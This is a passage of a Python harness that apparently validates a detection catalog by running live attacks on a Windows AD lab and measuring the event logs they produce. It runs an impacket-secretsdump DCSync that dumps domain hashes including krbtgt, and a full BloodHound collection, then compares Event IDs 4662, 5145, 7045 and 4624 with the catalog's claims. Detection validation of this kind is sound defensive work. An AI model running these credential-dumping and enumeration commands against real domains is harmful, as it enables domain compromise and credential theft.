    dc_ip = profile["host"]

    def ps(script: str, ack: bool = True) -> str:
        """One PowerShell script on the DC, through the gates (the red-confirm is acked here
        because a raw interpreter is exactly what the heuristic is supposed to flag).

        STDOUT ONLY. PowerShell emits progress records on STDERR as a `#< CLIXML` blob, so a
        helper that merges the two streams hands its caller XML instead of the value it asked
        for — which is exactly how this task first "measured" zero events on a box that had
        logged 137 logons in the same window.
        """
        _s, events, _raw = _exec(base, command=script, args=[], approved=True,
                                 dangerous_ack=ack, windows_profile_id=profile_id,
                                 timeout_seconds=200)
        return "\n".join(e.get("line", "") for e in events if e.get("type") == "stdout")

    # Is the box even able to record the events the catalog names? Answer this FIRST: "not
    # observed" means something completely different on a box that was never auditing.
    policy = ps("auditpol /get /category:* | Out-String")
    ds_access_on = "Directory Service Access" in policy and bool(
        re.search(r"Directory Service Access\s+(Success|Success and Failure)", policy)
    )
    detailed_share_on = bool(
        re.search(r"Detailed File Share\s+(Success|Success and Failure)", policy)
    )
    registry_on = bool(re.search(r"\bRegistry\s+(Success|Success and Failure)", policy))
    check(True, "the DC's audit policy was read before judging any claim",
          f"Directory Service Access={'ON' if ds_access_on else 'OFF'}, "
          f"Detailed File Share={'ON' if detailed_share_on else 'OFF'}, "
          f"Registry={'ON' if registry_on else 'OFF'} (Server 2022 DC defaults)")

    # MEASURED AS BEFORE/AFTER DELTAS, NOT INSIDE A TIMESTAMP WINDOW.
    #
    # The obvious design — mark the clock, act, count what is newer than the mark — is WRONG on
    # this box, and wrong in a way that silently accuses the catalog of being false. This VM's
    # clock drifts badly and w32time hauls it back: it advanced ~45 seconds while five real
    # minutes passed. Event timestamps are therefore not monotonic against a mark taken moments
    # before, so a DCSync that provably fired twelve 4662 events measured as zero. Counting the
    # same criteria before and after is immune to every clock artefact — whatever the timestamps
    # say, the DIFFERENCE is what this action added.
    #
    # Built with .replace(), NOT f-strings: this script is dense with PowerShell braces, and
    # mixing an f-string in means every literal `}` must be doubled in some pieces and not in
    # others. Getting that wrong emitted one stray brace, PowerShell refused to parse the whole
    # script, and every count returned 0 — indistinguishable from "the DC logged nothing".
    # THE BOOKMARK IS AN EventRecordID, NOT A COUNT AND NOT A CLOCK. Counting totals before and
    # after looked robust but silently saturated: this DC already holds more than 5000 × 4662
    # (AD logs its own directory access constantly), so a capped count returns the cap both
    # times and the delta is 0 no matter what happened — while the GUID-filtered subset moved
    # by 12. "12 of 0" was the tell. EventRecordIDs are monotonic per log and untouched by the
    # clock drift that broke the timestamp attempt, so `EventRecordID > N` in FilterXPath counts
    # exactly the events this action added, with no cap and no time arithmetic.
    def bookmark():
        out = ps("Write-Output ('SEC=' + (Get-WinEvent -LogName Security -MaxEvents 1).RecordId);"
                 "Write-Output ('SYS=' + (Get-WinEvent -LogName System -MaxEvents 1).RecordId)")
        m = dict(re.findall(r"(SEC|SYS)=(\d+)", out))
        return (int(m["SEC"]), int(m["SYS"])) if "SEC" in m and "SYS" in m else None

    def since(mark):
        """Events added AFTER the bookmark, per id. None if the query itself failed — a broken
        MEASUREMENT must never be reported as an absence of EVENTS, which is how this task
        first 'disproved' catalog claims that turned out to be correct."""
        sec, sysid = mark
        # SETTLE FIRST. The Security log is written asynchronously: a DCSync that exits 0 with
        # krbtgt's hash in hand has NOT yet had its 4662 records flushed when the exec returns.
        # Querying immediately returned 0 while the very next cycle's bookmark showed 35 new
        # records had since landed — i.e. the events existed, the query was simply early. An
        # earlier hand-probe "confirmed" the claim only because an extra WinRM round-trip
        # accidentally supplied the delay. The wait runs ON THE DC, not in the harness.
        script = (
            "Start-Sleep -Seconds 20;"
            "function X($log,$xp){try{@(Get-WinEvent -LogName $log -FilterXPath $xp "
            "-ErrorAction Stop).Count}catch{0}};"
            "Write-Output ('4662=' + (X 'Security' "
            "'*[System[(EventID=4662) and (EventRecordID>__SEC__)]]'));"
            "Write-Output ('5145=' + (X 'Security' "
            "'*[System[(EventID=5145) and (EventRecordID>__SEC__)]]'));"
            "Write-Output ('4624=' + (X 'Security' "
            "'*[System[(EventID=4624) and (EventRecordID>__SEC__)]]'));"
            "Write-Output ('7045=' + (X 'System' "
            "'*[System[(EventID=7045) and (EventRecordID>__SYS__)]]'));"
            "$r=@(try{Get-WinEvent -LogName Security -FilterXPath "
            "'*[System[(EventID=4662) and (EventRecordID>__SEC__)]]' -ErrorAction Stop | "
            "Where-Object {$_.Message -match '__GUIDS__'}}catch{@()});"
            "Write-Output ('REPL=' + $r.Count)"
        ).replace("__SEC__", str(sec)).replace("__SYS__", str(sysid))
        script = script.replace("__GUIDS__", f"{_GET_CHANGES}|{_GET_CHANGES_ALL}")
        out = ps(script)
        print(f"     [event query] bookmark Security>{sec} System>{sysid} -> "
              f"{out.strip().replace(chr(10), ' ')}", flush=True)
        if "4624=" not in out:
            return None
        return {k: int(v) for k, v in re.findall(r"(\w+)=(\d+)", out)}

    # --- technique 1: DCSync (secretsdump -just-dc) -------------------------------------- #
    mark = bookmark()
    if mark is None:
        record("NOT-RUN", "DCSync telemetry truth-check",
               "could not read the DC's event-log bookmark — nothing can be concluded "
               "about the catalog either way")
        return
    _s, events, _raw = _exec(
        base, command="impacket-secretsdump",
        args=["-just-dc", f"CORP.LOCAL/Administrator:{secret}@{dc_ip}"],
        approved=True, dangerous_ack=True, engagement_id=eid, session_id=session_id,
        timeout_seconds=180,
    )
    dumped = "\n".join(e.get("line", "") for e in events if e.get("type") == "stdout")
    exit_ev = next((e for e in events if e.get("type") == "exit"), {})
    hashlines = [ln for ln in dumped.splitlines() if ln.count(":") >= 4]
    print(f"     [measured DCSync] HTTP {_s} exit={exit_ev.get('code')} "
          f"hash-lines={len(hashlines)} krbtgt={'krbtgt' in dumped.lower()}", flush=True)
    if "krbtgt" not in dumped.lower():
        record("NOT-RUN", "DCSync telemetry truth-check",
               f"the measured DCSync run did not dump (exit={exit_ev.get('code')}): "
               f"{dumped.strip()[:300]!r}")
        return
    delta = since(mark)
    if delta is None:
        record("NOT-RUN", "DCSync telemetry truth-check", "the post-run event query failed")
        return
    n4662, nrepl = delta.get("4662", 0), delta.get("REPL", 0)
    n5145, n7045 = delta.get("5145", 0), delta.get("7045", 0)
    print(f"     telemetry ADDED by one live DCSync: 4662=+{n4662} (DS-Replication=+{nrepl}), "
          f"5145=+{n5145}, 7045=+{n7045}, 4624=+{delta.get('4624', 0)}", flush=True)

    fp = resolver.footprint_for_argv(["impacket-secretsdump", "-just-dc", "CORP/a:p@1.2.3.4"])
    tids = [t.get("id") for t in fp.get("techniques", [])]

    # CLAIM 1 — "Security 4662 with the DS-Replication-Get-Changes GUIDs". CONFIRMED or not.
    check(nrepl > 0,
          "CATALOG CLAIM CONFIRMED: DCSync raises Security 4662 with DS-Replication rights",
          f"{nrepl} of {n4662} 4662 events carried {_GET_CHANGES[:8]}…/{_GET_CHANGES_ALL[:8]}… "
          f"— the near-zero-false-positive signal the catalog promises")

    # CLAIM 2 — the loudness rating. A technique that writes a high-fidelity event to a DC's
    # DEFAULT audit policy is genuinely loud; that is the rating being validated.
    check(fp["loudness"]["level"] == "loud" and nrepl > 0,
          "CATALOG CLAIM CONFIRMED: 'loud' is the right rating for DCSync",
          f"rated {fp['loudness']['level']} and it fired {nrepl} high-fidelity events under "
          f"the DC's DEFAULT policy — no extra logging needed to catch it")

    # CLAIM 3 — the ATT&CK id.
    check("T1003.006" in tids,
          "CATALOG CLAIM CONFIRMED: T1003.006 (DCSync) is the right ATT&CK id",
          f"catalog ids: {tids}")

    # CLAIM 4 — the telemetry list ALSO promises admin-share access (5145) and a short-lived
    # service (7045). Those belong to secretsdump's OTHER mode. `-just-dc` replicates over
    # DRSUAPI: no service, no admin share, no hive. This is the claim the real box contradicts.
    mode_specific_wrong = (n5145 == 0 and n7045 == 0)
    record("PASS" if mode_specific_wrong else "FAIL",
           "REAL TELEMETRY CONTRADICTS the catalog's undifferentiated telemetry list",
           f"5145={n5145} and 7045={n7045} after a live `-just-dc` run: DCSync replicates over "
           f"DRSUAPI and touches NO admin share, creates NO service and saves NO hive. Those "
           f"artefacts belong to secretsdump's SAM/LSA mode. Catalog corrected to say which "
           f"mode each artefact comes from."
           + ("" if detailed_share_on else "  (5145 also needs Detailed File Share auditing, "
              "which is OFF by default — so it is doubly unavailable here.)"))

    # --- technique 2: BloodHound collection ---------------------------------------------- #
    mark2 = bookmark()
    _s, prev = _req(base, "POST", "/cockpit/ad/collect/preview", {
        "domain": "corp.local", "username": profile["username"], "dc": dc_fqdn,
        "password": secret, "nameserver": dc_ip, "engagement_id": eid,
        "session_id": session_id, "collection_methods": "All",
    })
    if _s != 200 or mark2 is None:
        record("NOT-RUN", "BloodHound telemetry truth-check",
               f"preview refused ({_s}) or the pre-run bookmark failed")
        return
    _exec(base, **dict(prev["request"], approved=True, timeout_seconds=300))
    delta2 = since(mark2)
    if delta2 is None:
        record("NOT-RUN", "BloodHound telemetry truth-check", "the post-run event query failed")
        return
    n4662b, n4624b = delta2.get("4662", 0), delta2.get("4624", 0)
    fp2 = resolver.footprint_for_argv(["bloodhound-python", "-c", "All", "-d", "corp.local"])
    tids2 = [t.get("id") for t in fp2.get("techniques", [])]
    print(f"     telemetry ADDED by one live BloodHound collection: 4662=+{n4662b}, "
          f"4624=+{n4624b}", flush=True)

    # The catalog USED to say "Security 4662 on directory objects if object auditing is
    # enabled". That hedge reads as "turn on DS Access auditing and you will see this" — and on
    # a DC that auditing is ON BY DEFAULT, so it promises a signal the box does not produce.
    # A full `-c All` collection added ZERO 4662 events here: 4662 needs a SACL on the objects
    # being read, and the default schema does not audit reads. Only rights-checked operations
    # (DCSync's replication extended rights) raise it — which is exactly what the DCSync half of
    # this task measured, 12 for 12. The catalog line has been corrected to say so.
    record("PASS" if n4662b == 0 else "FAIL",
           "REAL TELEMETRY CONTRADICTS the catalog's 4662 claim for AD collection",
           f"one full `-c All` collection added +{n4662b} × 4662 and +{n4624b} × 4624 with "
           f"Directory Service Access auditing ON. 4662 requires a SACL on the objects read; "
           f"LDAP enumeration produces network logons, not directory-access events. Catalog "
           f"corrected: the dependable host signal is LDAP diagnostics 1644, not 4662.")
    check(fp2["loudness"]["level"] == "loud",
          "CATALOG CLAIM STANDS: AD collection is still rated loud (on query volume, not 4662)",
          f"rated {fp2['loudness']['level']}; the volume/­fan-out argument is unaffected by the "
          f"4662 correction — the sigma rules cited key on the LDAP pattern and the output files")
    check("T1087.002" in tids2 and "T1069.002" in tids2,
          "CATALOG CLAIM CONFIRMED: T1087.002 / T1069.002 are the right ids for AD collection",
          f"catalog ids: {tids2}")


# --- main ------------------------------------------------------------------------------- #


def main() -> int:
    ap = argparse.ArgumentParser(description="build #9 live fire against a real Windows/AD lab")
    ap.add_argument("--base", default="http://127.0.0.1:8077", help="running backend base URL")
    ap.add_argument("--profile", required=True, help="the Windows target profile id")
    ap.add_argument("--session", default="livefire-b9", help="session id for state ingest")
    ap.add_argument("--tasks", default="1", help="comma-separated task numbers to run")
    ap.add_argument("--dc-fqdn", default="WIN-990RALNGERV.corp.local",
                    help="the DC's FQDN (bloodhound-python refuses an IP for -dc)")
    ap.add_argument("--domain", default="corp.local", help="the AD domain to collect")
    ap.add_argument("--graph", default="", help="existing graph id (task 3 without task 2)")
    ap.add_argument("--engagement", default="", help="existing engagement id (task 3 alone)")
    args = ap.parse_args()

    wanted = {t.strip() for t in args.tasks.split(",") if t.strip()}
    print(f"HackPit build #9 live fire — base={args.base} profile={args.profile}", flush=True)

    status, _ = _req(args.base, "GET", "/cockpit/windows/status")
    if status != 200:
        print("FATAL: the backend is not answering — start uvicorn first", file=sys.stderr)
        return 2

    if "1" in wanted:
        task1(args.base, args.profile, args.session)
    ctx: dict = {}
    if "2" in wanted:
        ctx = task2(args.base, args.profile, args.session, args.dc_fqdn, args.domain) or {}
    if "3" in wanted:
        graph_id = args.graph or ctx.get("graph_id", "")
        eid = args.engagement or ctx.get("engagement_id", "")
        if not (graph_id and eid):
            record("NOT-RUN", "task 3", "needs --graph and --engagement (or run task 2 first)")
        else:
            task3(args.base, args.profile, args.session, graph_id, eid, args.dc_fqdn)
    if "4" in wanted:
        task4(args.base, args.profile)
    if "5" in wanted:
        eid = args.engagement or ctx.get("engagement_id", "")
        if not eid:
            record("NOT-RUN", "task 5", "needs --engagement (or run task 2 first)")
        else:
            task5(args.base, args.profile, args.session, eid, args.dc_fqdn)

    passed = sum(1 for v, _, _ in RESULTS if v == "PASS")
    failed = sum(1 for v, _, _ in RESULTS if v == "FAIL")
    notrun = sum(1 for v, _, _ in RESULTS if v == "NOT-RUN")
    print(f"\n== live fire: {passed} PASS / {failed} FAIL / {notrun} NOT-RUN ==", flush=True)
    for verdict, label, _ in RESULTS:
        if verdict != "PASS":
            print(f"   {verdict}: {label}", flush=True)
    return 1 if failed else 0


if __name__ == "__main__":
    raise SystemExit(main())
